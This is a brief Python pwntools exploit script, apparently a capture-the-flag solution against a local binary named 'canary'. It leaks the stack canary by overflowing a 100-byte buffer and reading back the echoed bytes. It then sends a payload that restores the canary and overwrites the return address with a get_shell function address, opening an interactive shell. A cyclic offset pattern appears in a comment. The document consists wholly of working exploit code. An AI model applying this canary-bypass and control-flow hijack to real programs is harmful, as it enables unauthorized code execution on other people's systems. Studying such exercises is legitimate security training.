from pwn import *
get_shell = p32(0x08049256)

'''
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
'''
io = process("./canary")
io.recvuntil("Hello Hacker!")
io.sendline("A" * 100)
io.recvuntil("A" * 100)
canary = u32(io.recv(4)) - 0x0a
log.info("canary %x" % canary)


payload = "A" * 100 + p32(canary) + "A" * 12 + get_shell
io.send(payload)
io.recv()
io.interactive()

